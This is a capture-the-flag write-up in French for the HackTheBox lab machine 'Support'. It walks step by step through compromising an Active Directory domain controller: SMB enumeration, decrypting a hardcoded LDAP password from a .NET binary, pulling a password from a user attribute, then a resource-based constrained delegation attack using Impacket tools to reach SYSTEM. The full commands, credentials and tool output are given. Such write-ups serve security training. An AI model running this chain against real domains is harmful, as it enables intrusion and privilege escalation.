# Write-up -- HackTheBox : Support

Write-up réalisé pour la machine Support de HackTheBox. La chaîne d'exploitation démarre par une énumération SMB anonyme, passe par la rétro-ingénierie d'un exécutable .NET pour récupérer des credentials LDAP, puis enchaîne une requête LDAP pour obtenir le mot de passe d'un utilisateur stocké dans ses attributs, et se termine par une attaque Active Directory RBCD (Resource-Based Constrained Delegation) rendue possible grâce au droit GenericAll sur l'objet ordinateur du contrôleur de domaine.

L'IP de la machine pendant ma session était `10.129.230.181`.

---

## 1) How many shares is Support showing on SMB?

On commence par un scan nmap :

```bash
nmap -sS -sV -sC 10.129.230.181
```

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

Le profil de ports est caractéristique d'un **contrôleur de domaine Active Directory** : DNS (53), Kerberos (88), LDAP (389, 3268), SMB (139, 445) et WinRM (5985). On ajoute `support.htb` à `/etc/hosts`.

Les ports 139 et 445 correspondent à SMB. On liste les partages disponibles sans authentification :

```bash
smbclient -L //10.129.230.181
```

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
support-tools   Disk      support staff tools
SYSVOL          Disk      Logon server share
```

**Réponse : 6**

---

## 2) Which share is not a default share for a Windows domain controller?

Les partages `ADMIN$`, `C$`, `IPC$`, `NETLOGON` et `SYSVOL` sont tous présents par défaut sur n'importe quel contrôleur de domaine Windows. Le seul non-standard est `support-tools`.

**Réponse : `support-tools`**

---

## 3) Almost all of the files in this share are publicly available tools, but one is not. What is the name of that file?

On se connecte au partage `support-tools` sans mot de passe :

```bash
smbclient -N //10.129.230.181/support-tools
```

```
smb: \> ls
  7-ZipPortable_21.07.paf.exe
  npp.8.4.1.portable.x64.zip
  putty.exe
  SysinternalsSuite.zip
  UserInfo.exe.zip
  windirstat1_1_2_setup.exe
  WiresharkPortable64_3.6.5.paf.exe
```

7-Zip, Notepad++, PuTTY, Sysinternals, WinDirStat, Wireshark sont tous des outils publics et connus. `UserInfo.exe.zip` en revanche n'est pas un outil standard distribué publiquement, c'est un exécutable maison.

**Réponse : `UserInfo.exe.zip`**

---

## 4) What is the plain text password found in UserInfo.exe?

On télécharge l'archive et on tente de lancer l'exécutable :

```bash
get UserInfo.exe.zip
unzip UserInfo.exe.zip
wine UserInfo.exe
```

Les commandes de l'outil ne fonctionnent pas directement. On lance un `strings` sur le binaire et on trouve une chaîne encodée en base64 : `0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E`. Ce n'est pas un mot de passe en clair, il faut comprendre comment l'exécutable le transforme.

L'exécutable est un binaire .NET. On le décompile avec `monodis` pour lire le bytecode CIL intermédiaire :

```bash
monodis --output=UserInfo.il UserInfo.exe
```

Dans le code IL de la méthode `getPassword()`, on lit la logique de déchiffrement pas à pas :

```
IL_0005: Convert::FromBase64String      → décode la chaîne base64
IL_0015: ldelem.u1 / ldsfld key         → charge chaque octet de la clé
IL_0023: rem                            → clé cyclique (modulo longueur)
IL_0025: xor                            → XOR avec la clé
IL_002b: xor 223                        → second XOR avec la constante 0xDF
```

L'algorithme est donc : pour chaque octet de la chaîne base64 décodée, on fait un XOR avec l'octet correspondant de la clé (cyclique) puis un second XOR avec `0xDF` (223 en décimal). On retrouve la clé dans le code : `armando`. On reproduit le déchiffrement en Python :

```python
import base64

enc = base64.b64decode("0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E")
key = b"armando"
result = bytes([b ^ key[i % len(key)] ^ 223 for i, b in enumerate(enc)])
print(result.decode())
```

```
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

**Réponse : `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`**

---

## 5) What is the support user's password?

On dispose maintenant d'un mot de passe et du nom d'utilisateur `ldap` déduit du code source. On s'authentifie sur le serveur LDAP pour énumérer l'annuaire. L'objectif est de trouver des attributs non-standard sur les comptes utilisateurs :

```bash
ldapsearch -x -H ldap://support.htb -D "ldap@support.htb" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" "(objectClass=user)" info
```

Dans les résultats, l'objet de l'utilisateur `support` contient un attribut `info` avec une valeur inattendue :

```
dn: CN=support,CN=Users,DC=support,DC=htb
info: Ironside47pleasure40Watchful
```

**Réponse : `Ironside47pleasure40Watchful`**

---

## 6) What open port on Support allows a user in the Remote Management Users group to run PowerShell commands and get an interactive shell?

En énumérant les groupes du domaine avec netexec, on confirme que l'utilisateur `support` est membre du groupe `Remote Management Users` :

```bash
netexec ldap support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb --groups
```

Ce groupe autorise l'accès à **WinRM**, le service de gestion distante Windows qui permet d'exécuter des commandes PowerShell interactivement. WinRM écoute sur le port **5985**, repéré lors du scan nmap initial.

**Réponse : `5985`**

---

## 7) Submit the flag located on the support user's desktop.

On se connecte via evil-winrm avec les credentials de `support` :

```bash
evil-winrm -i support.htb -u support -p Ironside47pleasure40Watchful
```

```
*Evil-WinRM* PS C:\Users\support\Desktop> cat user.txt
448...
```

**Flag user : `448...`**

---

## 8) Bloodhound data will show that the support user has what privilege on the DC.SUPPORT.HTB object?

On collecte les données Active Directory avec bloodhound-python pour les importer dans BloodHound et cartographier les chemins d'attaque :

```bash
bloodhound-python -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb -ns 10.129.95.123 -c All
```

On charge les fichiers JSON dans l'interface BloodHound, on ouvre l'onglet **Pathfinding** et on trace le chemin de `SUPPORT@SUPPORT.HTB` vers `DC.SUPPORT.HTB`. BloodHound révèle que `support` est membre du groupe `Shared Support Accounts`, et que ce groupe possède le droit **GenericAll** sur l'objet ordinateur `DC.SUPPORT.HTB`.

GenericAll est le droit le plus étendu qui soit en Active Directory : il donne un contrôle total sur l'objet cible, y compris la possibilité de modifier ses attributs de sécurité comme `msDS-AllowedToActOnBehalfOfOtherIdentity`, ce qui ouvre la voie à une attaque RBCD.

**Réponse : `GenericAll`**

---

## 9) A common attack with generic all on a computer object is to add a fake computer to the domain. What attribute on the domain sets how many computer accounts a user is allowed to create in the domain?

L'attaque RBCD (Resource-Based Constrained Delegation) consiste à convaincre un ordinateur du domaine d'accepter qu'une machine qu'on contrôle puisse agir au nom de n'importe quel utilisateur pour accéder à lui. On crée d'abord une fausse machine dans le domaine, on configure la délégation depuis cette machine vers le DC, puis on utilise les mécanismes Kerberos S4U2Self et S4U2Proxy pour obtenir un ticket de service en se faisant passer pour l'administrateur, sans jamais connaître son mot de passe.

Avant de créer la fausse machine, on vérifie que le quota de création de comptes machine permet bien à un utilisateur standard d'en créer. L'attribut qui contrôle ce quota est `ms-DS-MachineAccountQuota` :

```bash
ldapsearch -x -H ldap://support.htb -D "ldap@support.htb" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" -s base "ms-DS-MachineAccountQuota"
```

```
ms-DS-MachineAccountQuota: 10
```

Le quota est de 10, on peut créer jusqu'à 10 comptes machine depuis un compte utilisateur standard. C'est suffisant.

**Réponse : `ms-DS-MachineAccountQuota`**

---

## 10) Following the steps for the Computer Takeover attack, eventually I get a ticket for the administrator, which Rubeus says should give administrator access in that session, but it doesn't work. What is the name of the script from Impacket that can convert that ticket to ccache format?

On enchaîne les quatre étapes de l'attaque RBCD avec les outils Impacket.
Sources : `https://www.thehacker.recipes/ad/movement/builtins/machineaccountquota` et `https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd`

**1 -- Création de la fausse machine dans le domaine**

```bash
impacket-addcomputer \
    -computer-name 'SomeName$' \
    -computer-pass 'SomePassword' \
    -dc-host "DC.support.htb" \
    -domain-netbios "support.htb" \
    "support.htb"/"support":"Ironside47pleasure40Watchful"
```

```
[*] Successfully added machine account SomeName$ with password SomePassword.
```

**2 -- Configuration de la délégation RBCD vers le DC**

On modifie l'attribut `msDS-AllowedToActOnBehalfOfOtherIdentity` du DC pour y inscrire notre fausse machine, ce que GenericAll nous autorise à faire :

```bash
impacket-rbcd \
    -delegate-from 'SomeName$' \
    -delegate-to 'DC$' \
    -action write \
    support.htb/support:'Ironside47pleasure40Watchful' \
    -dc-ip 10.129.95.123
```

```
[*] Delegation rights modified successfully!
[*] SomeName$ can now impersonate users on DC$ via S4U2Proxy
```

**3 -- Obtention d'un ticket de service en tant qu'Administrator**

On utilise `getST` pour enchaîner S4U2Self (obtenir un ticket pour SomeName$ en se faisant passer pour Administrator) puis S4U2Proxy (échanger ce ticket contre un ticket CIFS pour le DC) :

```bash
impacket-getST \
    -spn cifs/dc.support.htb \
    -impersonate administrator \
    support.htb/'SomeName$':'SomePassword' \
    -dc-ip 10.129.95.123
```

```
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

Le ticket est directement au format `.ccache` utilisable sous Linux. Si on était parti de Rubeus sous Windows, le ticket serait au format `.kirbi` et il faudrait le convertir avec `ticketConverter.py`.

**Réponse : `ticketConverter.py`**

---

## 11) What is the name of the environment variable on our local system that we'll set to that ccache file to allow use of files like psexec.py with the -k and -no-pass options?

On indique à la bibliothèque Kerberos Linux quel ticket utiliser via la variable d'environnement `KRB5CCNAME` :

```bash
export KRB5CCNAME=administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

`psexec.py` (et les autres outils Impacket) lisent automatiquement cette variable quand on passe `-k -no-pass`, ce qui leur permet de s'authentifier via Kerberos sans demander de mot de passe.

**Réponse : `KRB5CCNAME`**

---

## 12) Submit the flag located on the administrator's desktop.

On se connecte en tant qu'`administrator` via psexec, en utilisant le ticket Kerberos :

```bash
impacket-psexec -k -no-pass administrator@dc.support.htb
```

```
[*] Found writable share ADMIN$
[*] Uploading file AJGoWRAX.exe
[*] Creating service qPUb on dc.support.htb...
[*] Starting service qPUb...

C:\Windows\system32> whoami
nt authority\system
```

```
C:\Users\Administrator\Desktop> cat root.txt
d68...
```

**Flag root : `d68...`**
